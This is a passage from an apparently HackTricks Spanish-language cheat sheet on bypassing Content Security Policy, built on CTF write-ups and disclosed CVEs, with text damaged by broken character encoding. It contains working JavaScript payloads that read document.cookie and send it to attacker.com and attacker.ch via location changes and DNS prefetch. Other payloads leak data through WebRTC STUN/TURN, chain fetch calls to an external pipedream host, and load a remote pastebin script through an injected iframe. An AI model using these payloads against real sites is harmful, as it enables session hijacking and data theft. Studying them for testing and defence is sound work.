Este ataque implicar√≠a cierta ingenier√≠a social donde el atacante **convence al usuario de arrastrar y soltar un enlace sobre el bookmarklet del navegador**. Este bookmarklet contendr√≠a c√≥digo **javascript malicioso** que, al ser arrastrado y soltado o clickeado, se ejecutar√≠a en el contexto de la ventana web actual, **burlando CSP y permitiendo robar informaci√≥n sensible** como cookies o tokens.

Para m√°s informaci√≥n [**consulta el informe original aqu√≠**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Eludir CSP restringiendo CSP

En [**este writeup de CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), se elude CSP inyectando dentro de un iframe permitido un CSP m√°s restrictivo que prohib√≠a cargar un archivo JS espec√≠fico que, luego, a trav√©s de **prototype pollution** o **dom clobbering** permit√≠a **abusar de un script diferente para cargar un script arbitrario**.

Puedes **restringir un CSP de un Iframe** con el atributo **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

En [**este writeup de CTF**](https://github.com/aszx87410/ctf-writeups/issues/48), fue posible mediante **inyecci√≥n de HTML** **restringir** a√∫n m√°s una **CSP** de modo que un script que preven√≠a CSTI fue deshabilitado y por lo tanto la **vulnerabilidad se volvi√≥ explotable.**\
La CSP puede hacerse m√°s restrictiva utilizando **etiquetas meta HTML** y los scripts en l√≠nea pueden deshabilitarse **eliminando** la **entrada** que permite su **nonce** y **habilitar scripts en l√≠nea espec√≠ficos v√≠a sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Exfiltraci√≥n de JS con Content-Security-Policy-Report-Only

Si logras hacer que el servidor responda con el encabezado **`Content-Security-Policy-Report-Only`** con un **valor controlado por ti** (quiz√°s debido a un CRLF), podr√≠as hacer que apunte a tu servidor y si **envuelves** el **contenido JS** que quieres exfiltrar con **`<script>`** y debido a que es muy probable que `unsafe-inline` no est√© permitido por el CSP, esto **desencadenar√° un error de CSP** y parte del script (que contiene la informaci√≥n sensible) ser√° enviado al servidor desde `Content-Security-Policy-Report-Only`.

Para ver un ejemplo [**revisa este writeup de CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Fuga de Informaci√≥n CSP + Iframe

Imagina una situaci√≥n donde una **p√°gina est√° redirigiendo** a una **p√°gina diferente con un secreto dependiendo** del **usuario**. Por ejemplo, el usuario **admin** accediendo a **redirectme.domain1.com** es redirigido a **adminsecret321.domain2.com** y puedes provocar un XSS al admin.\
**Adem√°s, las p√°ginas a las que se redirige no est√°n permitidas por la pol√≠tica de seguridad, pero la p√°gina que redirige s√≠ lo est√°.**

Puedes revelar el dominio al que el admin es redirigido a trav√©s de:

* **violaci√≥n de CSP**
* **reglas de CSP.**

La violaci√≥n de CSP es una fuga instant√°nea. Todo lo que se necesita hacer es cargar un iframe apuntando a `https://redirectme.domain1.com` y escuchar el evento `securitypolicyviolation` que contiene la propiedad `blockedURI` que contiene el dominio del URI bloqueado. Esto se debe a que `https://redirectme.domain1.com` (permitido por CSP) redirige a `https://adminsecret321.domain2.com` (**bloqueado por CSP**). Esto hace uso del comportamiento indefinido de c√≥mo manejar iframes con CSP. Chrome y Firefox se comportan de manera diferente con respecto a esto.

Cuando conoces los caracteres que pueden componer el subdominio secreto, tambi√©n puedes usar una b√∫squeda binaria y verificar cu√°ndo el CSP bloque√≥ el recurso y cu√°ndo no, creando diferentes dominios prohibidos en el CSP (en este caso el secreto puede estar en la forma doc-X-XXXX.secdrivencontent.dev)
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Truco de [**aqu√≠**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

¬°√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!

**Perspectivas de Hacking**\
Interact√∫a con contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e insights en tiempo real

**√öltimos Anuncios**\
Mantente informado con los lanzamientos de nuevas recompensas por errores y actualizaciones cr√≠ticas de la plataforma

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ¬°y comienza a colaborar con los mejores hackers hoy!

## Tecnolog√≠as Inseguras para Evadir CSP

### Sobrecarga del buffer de respuesta de PHP

PHP es conocido por **almacenar en b√∫fer la respuesta a 4096** bytes por defecto. Por lo tanto, si PHP est√° mostrando una advertencia, al proporcionar **suficientes datos dentro de las advertencias**, la **respuesta** ser√° **enviada** **antes** del **encabezado CSP**, provocando que el encabezado sea ignorado.\
Entonces, la t√©cnica consiste b√°sicamente en **llenar el buffer de respuesta con advertencias** para que el encabezado CSP no se env√≠e.

Idea de [**este writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Reescribir P√°gina de Error

De [**este writeup**](https://blog.ssrf.kr/69) parece que fue posible evadir una protecci√≥n CSP cargando una p√°gina de error (potencialmente sin CSP) y reescribiendo su contenido.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME es una t√©cnica que abusa de un XSS (o XSS altamente limitado) **en un punto final de una p√°gina** para **abusar de otros puntos finales del mismo origen.** Esto se hace cargando el punto final vulnerable desde una p√°gina del atacante y luego refrescando la p√°gina del atacante al punto final real en el mismo origen que se desea abusar. De esta manera, el **punto final vulnerable** puede usar el objeto **`opener`** en el **payload** para **acceder al DOM** del **punto final real a abusar**. Para m√°s informaci√≥n, consulta:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Adem√°s, **wordpress** tiene un punto final **JSONP** en `/wp-json/wp/v2/users/1?_jsonp=data` que **reflejar√°** los **datos** enviados en la salida (con la limitaci√≥n de solo letras, n√∫meros y puntos).

Un atacante puede abusar de ese punto final para **generar un ataque SOME** contra WordPress e **incrustarlo** dentro de `<script src=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` nota que este **script** se **cargar√°** porque est√° **permitido por 'self'**. Adem√°s, y debido a que WordPress est√° instalado, un atacante podr√≠a abusar del **ataque SOME** a trav√©s del **punto final de callback vulnerable** que **bypassea el CSP** para otorgar m√°s privilegios a un usuario, instalar un nuevo plugin...\
Para m√°s informaci√≥n sobre c√≥mo realizar este ataque, consulta [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Si hay un CSP estricto que no te permite **interactuar con servidores externos**, hay algunas cosas que siempre puedes hacer para exfiltrar la informaci√≥n.

### Location

Podr√≠as simplemente actualizar la ubicaci√≥n para enviar al servidor del atacante la informaci√≥n secreta:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Etiqueta meta

Podr√≠as redirigir inyectando una etiqueta meta (esto es solo una redirecci√≥n, esto no filtrar√° contenido)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Para cargar p√°ginas m√°s r√°pido, los navegadores van a pre-resolver nombres de host en direcciones IP y almacenarlas para su uso posterior.\
Puedes indicar a un navegador que pre-resuelva un nombre de host con: `<link rel="dns-prefetch" href="something.com">`

Podr√≠as abusar de este comportamiento para **exfiltrar informaci√≥n sensible a trav√©s de solicitudes DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Otra forma:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Para evitar que esto suceda, el servidor puede enviar el encabezado HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Aparentemente, esta t√©cnica no funciona en navegadores sin cabeza (bots)
{% endhint %}

### WebRTC

En varias p√°ginas puedes leer que **WebRTC no verifica la pol√≠tica `connect-src`** del CSP.

De hecho, puedes _filtrar_ informaci√≥n utilizando una _solicitud DNS_. Mira este c√≥digo:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Otra opci√≥n:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Verificaci√≥n de Pol√≠ticas CSP en L√≠nea

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Creaci√≥n Autom√°tica de CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referencias

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)

‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Perspectivas de Hacking**\
Interact√∫a con contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking.

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real.

**√öltimos Anuncios**\
Mantente informado con los lanzamientos de nuevas recompensas por errores y actualizaciones cr√≠ticas de la plataforma.

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo.

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
